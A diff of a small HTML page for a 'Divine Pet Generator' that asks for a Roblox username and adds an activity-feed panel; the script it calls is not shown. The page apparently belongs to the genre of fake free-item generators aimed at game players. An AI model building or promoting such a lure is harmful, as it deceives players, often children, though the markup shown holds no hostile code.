@@ -3,22 +3,24 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Grow a Garden Pet Generator</title>
+  <title>Roblox Pet Generator</title>
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
-  <div class="container glass">
-    <h1>✨ Divine Pet Generator ✨</h1>
-    <p>Enter your Roblox username to generate your pet!</p>
-    
-    <input type="text" id="username" placeholder="Enter Roblox username">
-    <button onclick="startGenerator()">🔍 Search</button>
+  <div class="container">
+    <h1>🌙 Divine Pet Generator</h1>
+    <p class="subtitle">Enter your Roblox username to generate a pet!</p>
+
+    <input type="text" id="username" placeholder="Enter Roblox Username">
+    <button onclick="startGenerator()">Check Username</button>
 
     <div id="profile"></div>
     <div id="loading"></div>
     <div id="result"></div>
     <div id="serverButton"></div>
   </div>
+
+  <div id="activityFeed"></div>
 
   <script src="app.js"></script>
 </body>
